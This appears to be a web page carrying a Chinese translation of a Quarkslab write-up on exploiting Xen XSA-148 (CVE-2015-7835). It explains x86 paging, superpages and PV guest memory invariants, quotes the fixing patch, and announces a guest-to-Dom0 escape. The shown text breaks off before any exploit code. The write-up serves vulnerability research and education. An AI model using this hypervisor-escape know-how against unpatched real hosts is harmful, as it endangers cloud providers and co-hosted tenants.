@@ -1,0 +1,773 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>Xen攻击第二篇：XSA-148--从guest到host - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Xen,guest,root,虚拟化安全,云安全,云安全漏洞,云漏洞"/>
+    
+        <meta name="description" content="Xen作现代虚拟化平台的一个重要代表,它的安全性值得全世界黑客的关注。本文将继续介绍 XSA-148[1]的利用,漏洞编号CVE-2015-7835,由阿里巴巴的栾尚聪发现并于2015年10月公开披露。今年年初,漏洞发现者作了一次分享[6]并提供了他巧妙的漏洞利用,这里我们选择继续发表本文的一个主要原因是我们的利用实现有点不一样。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>Xen攻击第二篇：XSA-148--从guest到host</h2>
+                <div class="article-msg">
+                    <span class="time">2016-08-01 21:36:07</span>
+                    
+                                        <span class="read">阅读：19423次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_2932"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="2932" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://blog.quarkslab.com/xen-exploitation-part-2-xsa-148-from-guest-to-host.html"
+                             target="_blank">来源： Au2o3t@360云安全团队</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2612165517" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01c466407f2a92aaf5.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2612165517" style="color:#848e99;">360GearTeam</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">原链: </span><a href="http://blog.quarkslab.com/xen-exploitation-part-1-xsa-105-from-nobody-to-root.html" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="color: windowtext;">http://blog.quarkslab.com/xen-exploitation-part-2-xsa-148-from-guest-to-host.html</span></a><br/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">作者: Jeremie Boutoille</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(255, 0, 0);"><strong><span style="color: rgb(255, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">译者: Au2o3t/360云安全团队</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(255, 0, 0);"><strong><span style="color: rgb(255, 0, 0); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">审校: Terence/360云安全团队</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 176, 80);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">Xen作现代虚拟化平台的一个重要代表,它的安全性值得全世界黑客的关注。本文将继续介绍 XSA-148[1]的利用,漏洞编号CVE-2015-7835,由阿里巴巴的栾尚聪发现并于2015年10月公开披露。今年年初,漏洞发现者作了一次分享[6]并提供了他巧妙的漏洞利用,这里我们选择继续发表本文的一个主要原因是我们的利用实现有点不一样。</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">为更好的理解本文,你可能需要了解一些基本的 x86 内存架构,这里我们尽可能写得详细清晰。本文中我们会先讨论该漏洞,接下来会演示如何通过一个普通的客户机DomU穿透到Dom0 环境中执行任意代码的利用过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">(文章较长,可以看这里的视频)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">(视频见:</span><a href="https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho%EF%BC%89" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">https://asciinema.org/a/cwm26vzbjqx0d3eseic51igho)</span></a></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-align: center;"><img src="http://p0.qhimg.com/t01cc39f6c4744f14d5.png" title="t01cc39f6c4744f14d5.png" alt="http://p0.qhimg.com/t01cc39f6c4744f14d5.png"/></p><p><br/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>XSA-148</em><em>漏洞描述</em></span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><em style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">公告上说</em><em style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">[1]</em><em style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">:</em></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>Xen </em><em>安全公告</em><em> CVE-2015-7835 / XSA-148</em><em>,第四版</em></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>x86</em><em>:</em><em>PV</em><em>客户机不受控的创建大页映射</em></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>问题描述</em></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>=============</em></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>当满足一定条件时,</em><em>Xen</em><em>中验证</em><em>2</em><em>级页表项的代码将被绕过,</em><em>PV </em><em>客户机可以通过大页映射创建可写的内存映射。</em></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>这将破坏</em><em>Xen</em><em>环境中内存页预期的“不变性”,使只读的页面变得可写。</em></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><em>即使未使用</em><em> “allowsuperpage” </em><em>命令行选项也能够实现上述绕过。</em></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">这里叙述的是2级页表,大页,半虚拟化客户机以及 Xen “不变性”。我们必须理解这些概念。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><strong><br/></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; color: rgb(0, 112, 192);"><strong>内存管理,页表及大页</strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">如公告所述,仅 x86 架构的客户机受到影响。这里对x86下的MMU进行介绍。MMU的目的是将虚拟地址(也叫线性地址)转换为物理地址。这是通过使用众所周知的分段和分页机制实现的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">之前发表的 XSA-105[8] 中已经介绍过分段,分页就在分段之后,只是要稍微复杂些。</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-align: center;"><img src="http://p0.qhimg.com/t0191f3c2792bba6bd5.png" title="t0191f3c2792bba6bd5.png" alt="http://p0.qhimg.com/t0191f3c2792bba6bd5.png"/></p><p><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">分页模式有三种,主要区别是不同的可被翻译的线性地址的大小不同,物理地址的大小不同以及页面大小不同。这里我们只讨论 IA-32e 模式,这是 Intel 64 架构的唯一可用模式。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">在分页模式下,CR3 寄存器中保存了一个表的物理地址,CPU 取线性地址某些位转换为当前表的条目号,条目中对应给出下一表的物理基址。</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-align: center;"><img src="http://p2.qhimg.com/t0192921f0ec6d29bc3.png" title="t0192921f0ec6d29bc3.png" alt="http://p2.qhimg.com/t0192921f0ec6d29bc3.png"/></p><p><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">如图所示,共有4级页表,它们的命名在 Xen,Linux 和 Intel 术语中各有不同:</span></p><p style="text-align:center"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><img src="http://p2.qhimg.com/t019c7724c77a43882b.jpg" title="t019c7724c77a43882b.jpg" alt="http://p2.qhimg.com/t019c7724c77a43882b.jpg"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">公告中提到了大页。如前所述,分页允许映射大小不同的页面,IA-32e让你可以映射 1GB页,2MB 页或者 4KB 页。2MB 页通常被称为大页。其差别在于 L2 的条目,它直接关联到 2MB 页,而不是指向 L1页表。这可以通过设置 L2 条目中的 PSE 标志(此标志在 Intel 文档中被称为 PS )实现。</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">我们将在本文中努力使用统一的术语,但本文仍将出现这三类术语。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><br/></p><p style="text-align: center;"><img src="http://p7.qhimg.com/t01bb8352a38dc19d64.png" title="t01bb8352a38dc19d64.png" alt="http://p7.qhimg.com/t01bb8352a38dc19d64.png"/></p><p><br/></p><p style="margin-left: 20px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; color: rgb(0, 112, 192);"><strong>PV </strong><strong>客户机和</strong><strong> MMU</strong></span></p><hr/><p style="margin-left: 20px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px; text-indent: 2em;">X86半虚拟化的内存管理在Xen wiki[3]上有比较详细的介绍。基本上,你需要知道的是:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·PV 客户机内核运行在3环,</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·PV 客户机使用直接分页:Xen 不为伪物理内存和实机地址之间增加抽象层,</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·PV 客户机需执行超级调用(HYPERVISOR_mmu_update)来更新页表,</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">·每次执行 HYPERVISOR_mmu_update 时,Xen 检查“不变性”,如:“一个已被引用的页如L4/L3/L2 / L1不能被另一个虚拟地址映射为可写的”。这些“不变性”必须得到保证,以确保客户机不能破坏整个系统。</span></p><p style="margin-left: 20px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"><strong>漏洞</strong></span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">有了以上知识,我们就不难理解公告内容了。似乎有可能创建一个可写的页表,之后,由于直接分页,那么就可以以读写权限映射任意宿主机的页面到客户机虚拟内存了。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">我们来看看补丁的差异:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span></p><pre class="brush:cpp;toolbar:false">x86:&nbsp;guard&nbsp;against&nbsp;undue&nbsp;super&nbsp;page&nbsp;PTE&nbsp;creation
+When&nbsp;optional&nbsp;super&nbsp;page&nbsp;support&nbsp;got&nbsp;added&nbsp;(commit&nbsp;bd1cd81d64&nbsp;&quot;x86:&nbsp;PV
+support&nbsp;for&nbsp;hugepages&quot;),&nbsp;two&nbsp;adjustments&nbsp;were&nbsp;missed:&nbsp;mod_l2_entry()
+needs&nbsp;to&nbsp;consider&nbsp;the&nbsp;PSE&nbsp;and&nbsp;RW&nbsp;bits&nbsp;when&nbsp;deciding&nbsp;whether&nbsp;to&nbsp;use&nbsp;the
+fast&nbsp;path,&nbsp;and&nbsp;the&nbsp;PSE&nbsp;bit&nbsp;must&nbsp;not&nbsp;be&nbsp;removed&nbsp;from&nbsp;L2_DISALLOW_MASK
+unconditionally.
+This&nbsp;is&nbsp;XSA-148.
+Signed-off-by:&nbsp;Jan&nbsp;Beulich&nbsp;&lt;jbeulich@suse.com&gt;
+Reviewed-by:&nbsp;Tim&nbsp;Deegan&nbsp;&lt;tim@xen.org&gt;
+---&nbsp;a/xen/arch/x86/mm.c
++++&nbsp;b/xen/arch/x86/mm.c
+@@&nbsp;-160,7&nbsp;+160,10&nbsp;@@&nbsp;static&nbsp;void&nbsp;put_superpage(unsigned&nbsp;long
+&nbsp;static&nbsp;uint32_t&nbsp;base_disallow_mask;
+&nbsp;/*&nbsp;Global&nbsp;bit&nbsp;is&nbsp;allowed&nbsp;to&nbsp;be&nbsp;set&nbsp;on&nbsp;L1&nbsp;PTEs.&nbsp;Intended&nbsp;for&nbsp;user&nbsp;mappings.&nbsp;*/
+&nbsp;#define&nbsp;L1_DISALLOW_MASK&nbsp;((base_disallow_mask&nbsp;|&nbsp;_PAGE_GNTTAB)&nbsp;&amp;&nbsp;~_PAGE_GLOBAL)
+-#define&nbsp;L2_DISALLOW_MASK&nbsp;(base_disallow_mask&nbsp;&amp;&nbsp;~_PAGE_PSE)
++
++#define&nbsp;L2_DISALLOW_MASK&nbsp;(unlikely(opt_allow_superpage)&nbsp;\
++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?&nbsp;base_disallow_mask&nbsp;&amp;&nbsp;~_PAGE_PSE&nbsp;\
++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;base_disallow_mask)
+&nbsp;#define&nbsp;l3_disallow_mask(d)&nbsp;(!is_pv_32bit_domain(d)&nbsp;?&nbsp;\
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;base_disallow_mask&nbsp;:&nbsp;0xFFFFF198U)
+@@&nbsp;-1841,7&nbsp;+1844,10&nbsp;@@&nbsp;static&nbsp;int&nbsp;mod_l2_entry(l2_pgentry_t&nbsp;*pl
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Fast&nbsp;path&nbsp;for&nbsp;identical&nbsp;mapping&nbsp;and&nbsp;presence.&nbsp;*/
+-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!l2e_has_changed(ol2e,&nbsp;nl2e,&nbsp;_PAGE_PRESENT)&nbsp;)
++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!l2e_has_changed(ol2e,&nbsp;nl2e,
++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlikely(opt_allow_superpage)
++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?&nbsp;_PAGE_PSE&nbsp;|&nbsp;_PAGE_RW&nbsp;|&nbsp;_PAGE_PRESENT
++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;_PAGE_PRESENT)&nbsp;)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;adjust_guest_l2e(nl2e,&nbsp;d);
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;UPDATE_ENTRY(l2,&nbsp;pl2e,&nbsp;ol2e,&nbsp;nl2e,&nbsp;pfn,&nbsp;vcpu,&nbsp;preserve_ad)&nbsp;)
+L2_DISALLOW_MASK&nbsp;从&nbsp;base_disallow_mask&nbsp;中去掉&nbsp;PSE&nbsp;标志,在这里:
+void&nbsp;__init&nbsp;arch_init_memory(void)
+{
+&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;i,&nbsp;pfn,&nbsp;rstart_pfn,&nbsp;rend_pfn,&nbsp;iostart_pfn,&nbsp;ioend_pfn;
+&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Basic&nbsp;guest-accessible&nbsp;flags:&nbsp;PRESENT,&nbsp;R/W,&nbsp;USER,&nbsp;A/D,&nbsp;AVAIL[0,1,2]&nbsp;*/
+&nbsp;&nbsp;&nbsp;&nbsp;base_disallow_mask&nbsp;=&nbsp;~(_PAGE_PRESENT|_PAGE_RW|_PAGE_USER|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_PAGE_ACCESSED|_PAGE_DIRTY|_PAGE_AVAIL);</pre><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;"></span><br/></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">因此,若没有补丁,客户机可以采用快速路径设置 L2 条目中的 PSE 标志,即使未设置 “allowsuperpage”选项。</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 14px;">若条目以及 _PAGE_PRESENT 未变,仅采用快速路径:</span></p><p style="margin-left: 14px; text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 